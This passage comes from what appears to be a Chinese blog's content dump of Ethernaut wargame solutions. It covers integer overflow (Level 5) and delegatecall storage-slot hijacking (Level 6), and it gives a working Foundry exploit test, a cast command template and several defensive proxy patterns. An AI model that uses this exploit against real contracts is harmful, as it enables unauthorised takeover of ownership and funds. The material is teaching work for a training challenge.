class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ExplicitCheckToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"整数溢出类型\"><a href=\"#整数溢出类型\" class=\"headerlink\" title=\"整数溢出类型\"></a>整数溢出类型</h3><table>\n<thead>\n<tr>\n<th>类型</th>\n<th>描述</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>上溢</strong></td>\n<td>超过最大值</td>\n<td><code>type(uint256).max + 1 = 0</code></td>\n</tr>\n<tr>\n<td><strong>下溢</strong></td>\n<td>低于最小值</td>\n<td><code>0 - 1 = type(uint256).max</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"Solidity-版本对比\"><a href=\"#Solidity-版本对比\" class=\"headerlink\" title=\"Solidity 版本对比\"></a>Solidity 版本对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Solidity 0.7.x 及以下</span><br><span class=\"line\">function unsafeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // 可能溢出，无自动检查</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Solidity 0.8.0+</span><br><span class=\"line\">function safeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // 自动检查溢出，溢出时 revert</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 显式不安全操作 (0.8.0+)</span><br><span class=\"line\">function explicitUnsafe(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    unchecked &#123;</span><br><span class=\"line\">        return a + b; // 显式跳过溢出检查</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安全数学运算\"><a href=\"#安全数学运算\" class=\"headerlink\" title=\"安全数学运算\"></a>安全数学运算</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 安全的余额检查</span><br><span class=\"line\">function safeTransfer(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _value;</span><br><span class=\"line\">    balances[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 使用 SafeMath (旧版本)</span><br><span class=\"line\">function safeTransferLegacy(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class=\"line\">    balances[_to] = balances[_to].add(_value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"著名的整数溢出攻击\"><a href=\"#著名的整数溢出攻击\" class=\"headerlink\" title=\"著名的整数溢出攻击\"></a>著名的整数溢出攻击</h3><ol>\n<li><p><strong>PoWHCoin</strong> (2018)</p>\n<ul>\n<li>攻击者利用整数溢出获得巨额代币</li>\n<li>导致项目完全崩溃</li>\n</ul>\n</li>\n<li><p><strong>BeautyChain (BEC)</strong> (2018)</p>\n<ul>\n<li>BatchOverFlow 漏洞</li>\n<li>造成代币价值归零</li>\n</ul>\n</li>\n<li><p><strong>SMT Token</strong> (2018)</p>\n<ul>\n<li>类似的批量转账溢出漏洞</li>\n<li>交易所暂停交易</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Token 关卡揭示了早期 Solidity 的重要安全隐患：</p>\n<ul>\n<li>✅ <strong>整数溢出的严重后果</strong> - 可以完全破坏代币经济学</li>\n<li>✅ <strong>版本升级的重要性</strong> - Solidity 0.8.0+ 提供内置保护</li>\n<li>✅ <strong>SafeMath 的历史价值</strong> - 在旧版本中提供安全保护</li>\n<li>✅ <strong>显式检查的必要性</strong> - 总是验证关键假设</li>\n</ul>\n<p>这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">上一关: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">下一关: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/2.x/api/math\">OpenZeppelin SafeMath</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 6: Delegation - delegatecall 存储槽攻击","date":"2025-01-25T06:50:00.000Z","updated":"2025-01-25T06:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入理解 delegatecall 的工作原理和安全风险，学习如何利用存储槽布局差异进行攻击，掌握代理模式的安全考量。","_content":"\n# 🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击\n\n> **关卡链接**: [Ethernaut Level 6 - Delegation](https://ethernaut.openzeppelin.com/level/6)  \n> **攻击类型**: delegatecall 存储槽攻击  \n> **难度**: ⭐⭐⭐⭐☆  \n> **核心概念**: 存储上下文切换、代理模式安全\n\n## 📋 挑战目标\n\n这个关卡考验对 `delegatecall` 机制的深入理解：\n\n1. **获取合约控制权** - 成为 `Delegation` 合约的 `owner`\n2. **理解上下文切换** - 掌握 `delegatecall` 的存储机制\n3. **学习代理模式风险** - 了解升级模式的安全隐患\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Delegate {\n    address public owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;  // 🎯 目标函数：会修改 owner\n    }\n}\n\ncontract Delegation {\n    address public owner;      // 🚨 存储槽 0\n    Delegate delegate;         // 🚨 存储槽 1\n\n    constructor(address _delegateAddress) {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    fallback() external {\n        // 🚨 危险的 delegatecall\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n```\n\n### 核心概念：delegatecall vs call\n\n| 调用方式 | 执行上下文 | 存储修改 | msg.sender | 使用场景 |\n|----------|------------|----------|------------|----------|\n| **call** | 被调用合约 | 被调用合约 | 调用合约地址 | 普通外部调用 |\n| **delegatecall** | 调用合约 | 调用合约 | 原始调用者 | 代理模式、升级 |\n\n### 漏洞原理\n\n**delegatecall 的工作机制**：\n- 执行**被调用合约的代码**\n- 使用**调用合约的存储**\n- 保持**原始的 msg.sender**\n\n```solidity\n// 当 Delegation 合约执行 delegatecall 时：\ndelegate.delegatecall(abi.encodeWithSignature(\"pwn()\"));\n\n// 实际执行：\n// 1. 运行 Delegate.pwn() 的代码\n// 2. 但是在 Delegation 合约的存储上下文中\n// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)\n```\n\n### 存储槽布局分析\n\n```solidity\n// Delegate 合约存储布局\n// 槽 0: address owner\n\n// Delegation 合约存储布局  \n// 槽 0: address owner     ← 这个会被 delegatecall 修改！\n// 槽 1: Delegate delegate\n```\n\n### 攻击路径\n\n1. **构造函数调用数据** - 编码 `pwn()` 函数选择器\n2. **触发 fallback 函数** - 向合约发送带数据的交易\n3. **执行 delegatecall** - 在 Delegation 存储上下文中执行 `pwn()`\n4. **获得控制权** - `owner` 被设置为攻击者地址\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Delegation.sol\";\n\ncontract DelegationTest is Test {\n    Delegate public delegate;\n    Delegation public delegation;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public deployer = makeAddr(\"deployer\");\n\n    function setUp() public {\n        vm.startPrank(deployer);\n        \n        // 部署 Delegate 合约\n        delegate = new Delegate(deployer);\n        \n        // 部署 Delegation 合约\n        delegation = new Delegation(address(delegate));\n        \n        vm.stopPrank();\n    }\n\n    function testDelegationExploit() public {\n        console.log(\"Initial owner:\", delegation.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        vm.startPrank(attacker);\n        \n        // 🎯 关键攻击：构造 pwn() 函数调用\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        \n        // 通过 fallback 函数触发 delegatecall\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Attack failed\");\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertEq(delegation.owner(), attacker);\n        console.log(\"New owner:\", delegation.owner());\n        console.log(\"Attack successful!\");\n    }\n    \n    function testUnderstandDelegatecall() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"=== Before Attack ===\");\n        console.log(\"Delegation owner:\", delegation.owner());\n        console.log(\"Delegate owner:\", delegate.owner());\n        \n        // 直接调用 delegate.pwn() 只会修改 delegate 的存储\n        delegate.pwn();\n        \n        console.log(\"=== After direct call to Delegate.pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // 不变\n        console.log(\"Delegate owner:\", delegate.owner());     // 变为 attacker\n        \n        // 重置状态\n        vm.stopPrank();\n        vm.prank(deployer);\n        delegate = new Delegate(deployer);\n        \n        vm.startPrank(attacker);\n        \n        // 通过 delegatecall 调用 pwn()\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Delegatecall failed\");\n        \n        console.log(\"=== After delegatecall to pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // 变为 attacker!\n        console.log(\"Delegate owner:\", delegate.owner());     // 不变\n        \n        vm.stopPrank();\n    }\n    \n    function testFunctionSelector() public view {\n        // 演示函数选择器的计算\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.log(\"pwn() selector:\");\n        console.logBytes4(selector);\n        \n        bytes memory encoded = abi.encodeWithSignature(\"pwn()\");\n        console.log(\"Encoded call data:\");\n        console.logBytes(encoded);\n    }\n}\n```\n\n### 手动攻击脚本\n\n```solidity\n// 如果需要手动攻击，可以使用 cast 命令\ncontract ManualAttack is Test {\n    function testManualAttack() public {\n        // 1. 计算函数选择器\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.logBytes4(selector);\n        \n        // 2. 使用 cast 发送交易\n        // cast send <DELEGATION_ADDRESS> <SELECTOR> --private-key <YOUR_KEY>\n        // 例如：cast send 0x... 0xdd365b8b --private-key ...\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Delegation 攻击测试\nforge test --match-contract DelegationTest -vvv\n\n# 预期输出：\n# Initial owner: 0x... (deployer)\n# Attacker address: 0x... (attacker) \n# New owner: 0x... (attacker)\n# Attack successful!\n```\n\n## 🛡️ 防御措施\n\n### 1. 严格的存储布局匹配\n\n```solidity\ncontract SafeProxy {\n    // ✅ 确保代理和实现合约有相同的存储布局\n    address public owner;           // 槽 0\n    address public implementation; // 槽 1\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n    \n    function upgrade(address newImplementation) public onlyOwner {\n        implementation = newImplementation;\n    }\n    \n    fallback() external {\n        address impl = implementation;\n        assembly {\n            // 使用内联汇编进行更安全的 delegatecall\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            \n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n}\n```\n\n### 2. 使用 OpenZeppelin 的代理模式\n\n```solidity\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\ncontract SecureUpgradeableContract {\n    // 使用 OpenZeppelin 的标准化代理实现\n    // 包含完整的安全检查和存储隔离\n}\n```\n\n### 3. 函数选择器白名单\n\n```solidity\ncontract RestrictedDelegation {\n    mapping(bytes4 => bool) public allowedSelectors;\n    \n    constructor() {\n        // 只允许特定函数被 delegatecall\n        allowedSelectors[bytes4(keccak256(\"safeFunction()\"))] = true;\n    }\n    \n    fallback() external {\n        bytes4 selector = bytes4(msg.data);\n        require(allowedSelectors[selector], \"Function not allowed\");\n        \n        // 执行 delegatecall\n    }\n}\n```\n\n### 4. 存储槽隔离\n\n```solidity\ncontract IsolatedStorage {\n    // 使用 EIP-1967 标准存储槽\n    bytes32 private constant IMPLEMENTATION_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1);\n    \n    bytes32 private constant ADMIN_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1);\n    \n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n    \n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 1. EVM 调用类型对比\n\n```solidity\ncontract CallExample {\n    function demonstrateCalls(address target) public {\n        // 1. call - 普通外部调用\n        (bool success1,) = target.call(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 2. delegatecall - 委托调用\n        (bool success2,) = target.delegatecall(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 3. staticcall - 只读调用\n        (bool success3,) = target.staticcall(\n            abi.encodeWithSignature(\"viewFunction()\")\n        );\n    }\n}\n```\n\n### 2. 存储槽冲突示例\n\n```solidity\n// ❌ 危险：不匹配的存储布局\ncontract ProxyV1 {\n    address public owner;    // 槽 0\n    uint256 public value;    // 槽 1\n}\n\ncontract ImplementationV1 {\n    uint256 public data;     // 槽 0 ← 冲突！\n    address public admin;    // 槽 1 ← 冲突！\n}\n\n// ✅ 安全：匹配的存储布局\ncontract ProxyV2 {\n    address public owner;    // 槽 0\n    uint256 public value;    // 槽 1\n}\n\ncontract ImplementationV2 {\n    address public owner;    // 槽 0 ← 匹配\n    uint256 public value;    // 槽 1 ← 匹配\n}\n```\n\n### 3. 函数选择器计算\n\n```solidity\nfunction calculateSelector() public pure returns (bytes4) {\n    // 方法 1：直接计算\n    bytes4 selector1 = bytes4(keccak256(\"pwn()\"));\n    \n    // 方法 2：使用 abi.encodeWithSignature\n    bytes memory data = abi.encodeWithSignature(\"pwn()\");\n    bytes4 selector2 = bytes4(data);\n    \n    // 方法 3：使用 this.functionName.selector\n    // bytes4 selector3 = this.pwn.selector; // 如果函数存在\n    \n    return selector1;\n}\n```\n\n## 🏛️ 实际应用场景\n\n### 代理模式的正确使用\n\n1. **升级模式**：\n   - UUPS (Universal Upgradeable Proxy Standard)\n   - Transparent Proxy Pattern\n   - Beacon Proxy Pattern\n\n2. **钻石模式** (EIP-2535)：\n   - 多面切割合约\n   - 功能模块化\n\n3. **最小代理** (EIP-1167)：\n   - Clone Factory Pattern\n   - 节省部署成本\n\n## 🎯 总结\n\nDelegation 关卡揭示了 `delegatecall` 的双刃剑特性：\n\n- ✅ **理解上下文切换机制** - 代码在不同存储空间执行\n- ✅ **掌握存储槽布局匹配** - 代理和实现必须一致\n- ✅ **学习安全代理模式** - 使用标准化解决方案\n- ✅ **认识函数选择器安全** - 控制可调用的函数\n\n`delegatecall` 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[下一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin 代理文档](https://docs.openzeppelin.com/contracts/4.x/api/proxy)**\n- **[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在智能合约的世界中，上下文就是一切。* 🔄","source":"_posts/ethernaut-level-06-delegation.md","raw":"---\ntitle: 'Ethernaut Level 6: Delegation - delegatecall 存储槽攻击'\ndate: 2025-01-25 14:50:00\nupdated: 2025-01-25 14:50:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - delegatecall\n  - 存储槽攻击\n  - 智能合约安全\n  - Solidity\n  - 上下文切换\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入理解 delegatecall 的工作原理和安全风险，学习如何利用存储槽布局差异进行攻击，掌握代理模式的安全考量。\"\n---\n\n# 🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击\n\n> **关卡链接**: [Ethernaut Level 6 - Delegation](https://ethernaut.openzeppelin.com/level/6)  \n> **攻击类型**: delegatecall 存储槽攻击  \n> **难度**: ⭐⭐⭐⭐☆  \n> **核心概念**: 存储上下文切换、代理模式安全\n\n## 📋 挑战目标\n\n这个关卡考验对 `delegatecall` 机制的深入理解：\n\n1. **获取合约控制权** - 成为 `Delegation` 合约的 `owner`\n2. **理解上下文切换** - 掌握 `delegatecall` 的存储机制\n3. **学习代理模式风险** - 了解升级模式的安全隐患\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Delegate {\n    address public owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;  // 🎯 目标函数：会修改 owner\n    }\n}\n\ncontract Delegation {\n    address public owner;      // 🚨 存储槽 0\n    Delegate delegate;         // 🚨 存储槽 1\n\n    constructor(address _delegateAddress) {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    fallback() external {\n        // 🚨 危险的 delegatecall\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n```\n\n### 核心概念：delegatecall vs call\n\n| 调用方式 | 执行上下文 | 存储修改 | msg.sender | 使用场景 |\n|----------|------------|----------|------------|----------|\n| **call** | 被调用合约 | 被调用合约 | 调用合约地址 | 普通外部调用 |\n| **delegatecall** | 调用合约 | 调用合约 | 原始调用者 | 代理模式、升级 |\n\n### 漏洞原理\n\n**delegatecall 的工作机制**：\n- 执行**被调用合约的代码**\n- 使用**调用合约的存储**\n- 保持**原始的 msg.sender**\n\n```solidity\n// 当 Delegation 合约执行 delegatecall 时：\ndelegate.delegatecall(abi.encodeWithSignature(\"pwn()\"));\n\n// 实际执行：\n// 1. 运行 Delegate.pwn() 的代码\n// 2. 但是在 Delegation 合约的存储上下文中\n// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)\n```\n\n### 存储槽布局分析\n\n```solidity\n// Delegate 合约存储布局\n// 槽 0: address owner\n\n// Delegation 合约存储布局  \n// 槽 0: address owner     ← 这个会被 delegatecall 修改！\n// 槽 1: Delegate delegate\n```\n\n### 攻击路径\n\n1. **构造函数调用数据** - 编码 `pwn()` 函数选择器\n2. **触发 fallback 函数** - 向合约发送带数据的交易\n3. **执行 delegatecall** - 在 Delegation 存储上下文中执行 `pwn()`\n4. **获得控制权** - `owner` 被设置为攻击者地址\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Delegation.sol\";\n\ncontract DelegationTest is Test {\n    Delegate public delegate;\n    Delegation public delegation;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public deployer = makeAddr(\"deployer\");\n\n    function setUp() public {\n        vm.startPrank(deployer);\n        \n        // 部署 Delegate 合约\n        delegate = new Delegate(deployer);\n        \n        // 部署 Delegation 合约\n        delegation = new Delegation(address(delegate));\n        \n        vm.stopPrank();\n    }\n\n    function testDelegationExploit() public {\n        console.log(\"Initial owner:\", delegation.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        vm.startPrank(attacker);\n        \n        // 🎯 关键攻击：构造 pwn() 函数调用\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        \n        // 通过 fallback 函数触发 delegatecall\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Attack failed\");\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertEq(delegation.owner(), attacker);\n        console.log(\"New owner:\", delegation.owner());\n        console.log(\"Attack successful!\");\n    }\n    \n    function testUnderstandDelegatecall() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"=== Before Attack ===\");\n        console.log(\"Delegation owner:\", delegation.owner());\n        console.log(\"Delegate owner:\", delegate.owner());\n        \n        // 直接调用 delegate.pwn() 只会修改 delegate 的存储\n        delegate.pwn();\n        \n        console.log(\"=== After direct call to Delegate.pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // 不变\n        console.log(\"Delegate owner:\", delegate.owner());     // 变为 attacker\n        \n        // 重置状态\n        vm.stopPrank();\n        vm.prank(deployer);\n        delegate = new Delegate(deployer);\n        \n        vm.startPrank(attacker);\n        \n        // 通过 delegatecall 调用 pwn()\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Delegatecall failed\");\n        \n        console.log(\"=== After delegatecall to pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // 变为 attacker!\n        console.log(\"Delegate owner:\", delegate.owner());     // 不变\n        \n        vm.stopPrank();\n    }\n    \n    function testFunctionSelector() public view {\n        // 演示函数选择器的计算\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.log(\"pwn() selector:\");\n        console.logBytes4(selector);\n        \n        bytes memory encoded = abi.encodeWithSignature(\"pwn()\");\n        console.log(\"Encoded call data:\");\n        console.logBytes(encoded);\n    }\n}\n```\n\n### 手动攻击脚本\n\n```solidity\n// 如果需要手动攻击，可以使用 cast 命令\ncontract ManualAttack is Test {\n    function testManualAttack() public {\n        // 1. 计算函数选择器\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.logBytes4(selector);\n        \n        // 2. 使用 cast 发送交易\n        // cast send <DELEGATION_ADDRESS> <SELECTOR> --private-key <YOUR_KEY>\n        // 例如：cast send 0x... 0xdd365b8b --private-key ...\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Delegation 攻击测试\nforge test --match-contract DelegationTest -vvv\n\n# 预期输出：\n# Initial owner: 0x... (deployer)\n# Attacker address: 0x... (attacker) \n# New owner: 0x... (attacker)\n# Attack successful!\n```\n\n## 🛡️ 防御措施\n\n### 1. 严格的存储布局匹配\n\n```solidity\ncontract SafeProxy {\n    // ✅ 确保代理和实现合约有相同的存储布局\n    address public owner;           // 槽 0\n    address public implementation; // 槽 1\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n    \n    function upgrade(address newImplementation) public onlyOwner {\n        implementation = newImplementation;\n    }\n    \n    fallback() external {\n        address impl = implementation;\n        assembly {\n            // 使用内联汇编进行更安全的 delegatecall\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            \n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n}\n```\n\n### 2. 使用 OpenZeppelin 的代理模式\n\n```solidity\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\ncontract SecureUpgradeableContract {\n    // 使用 OpenZeppelin 的标准化代理实现\n    // 包含完整的安全检查和存储隔离\n}\n```\n\n### 3. 函数选择器白名单\n\n```solidity\ncontract RestrictedDelegation {\n    mapping(bytes4 => bool) public allowedSelectors;\n    \n    constructor() {\n        // 只允许特定函数被 delegatecall\n        allowedSelectors[bytes4(keccak256(\"safeFunction()\"))] = true;\n    }\n    \n    fallback() external {\n        bytes4 selector = bytes4(msg.data);\n        require(allowedSelectors[selector], \"Function not allowed\");\n        \n        // 执行 delegatecall\n    }\n}\n```\n\n### 4. 存储槽隔离\n\n```solidity\ncontract IsolatedStorage {\n    // 使用 EIP-1967 标准存储槽\n    bytes32 private constant IMPLEMENTATION_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1);\n    \n    bytes32 private constant ADMIN_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1);\n    \n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n    \n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 1. EVM 调用类型对比\n\n```solidity\ncontract CallExample {\n    function demonstrateCalls(address target) public {\n        // 1. call - 普通外部调用\n        (bool success1,) = target.call(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 2. delegatecall - 委托调用\n        (bool success2,) = target.delegatecall(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 3. staticcall - 只读调用\n        (bool success3,) = target.staticcall(\n            abi.encodeWithSignature(\"viewFunction()\")\n        );\n    }\n}\n```\n\n### 2. 存储槽冲突示例\n\n```solidity\n// ❌ 危险：不匹配的存储布局\ncontract ProxyV1 {\n    address public owner;    // 槽 0\n    uint256 public value;    // 槽 1\n}\n\ncontract ImplementationV1 {\n    uint256 public data;     // 槽 0 ← 冲突！\n    address public admin;    // 槽 1 ← 冲突！\n}\n\n// ✅ 安全：匹配的存储布局\ncontract ProxyV2 {\n    address public owner;    // 槽 0\n    uint256 public value;    // 槽 1\n}\n\ncontract ImplementationV2 {\n    address public owner;    // 槽 0 ← 匹配\n    uint256 public value;    // 槽 1 ← 匹配\n}\n```\n\n### 3. 函数选择器计算\n\n```solidity\nfunction calculateSelector() public pure returns (bytes4) {\n    // 方法 1：直接计算\n    bytes4 selector1 = bytes4(keccak256(\"pwn()\"));\n    \n    // 方法 2：使用 abi.encodeWithSignature\n    bytes memory data = abi.encodeWithSignature(\"pwn()\");\n    bytes4 selector2 = bytes4(data);\n    \n    // 方法 3：使用 this.functionName.selector\n    // bytes4 selector3 = this.pwn.selector; // 如果函数存在\n    \n    return selector1;\n}\n```\n\n## 🏛️ 实际应用场景\n\n### 代理模式的正确使用\n\n1. **升级模式**：\n   - UUPS (Universal Upgradeable Proxy Standard)\n   - Transparent Proxy Pattern\n   - Beacon Proxy Pattern\n\n2. **钻石模式** (EIP-2535)：\n   - 多面切割合约\n   - 功能模块化\n\n3. **最小代理** (EIP-1167)：\n   - Clone Factory Pattern\n   - 节省部署成本\n\n## 🎯 总结\n\nDelegation 关卡揭示了 `delegatecall` 的双刃剑特性：\n\n- ✅ **理解上下文切换机制** - 代码在不同存储空间执行\n- ✅ **掌握存储槽布局匹配** - 代理和实现必须一致\n- ✅ **学习安全代理模式** - 使用标准化解决方案\n- ✅ **认识函数选择器安全** - 控制可调用的函数\n\n`delegatecall` 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[下一关: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin 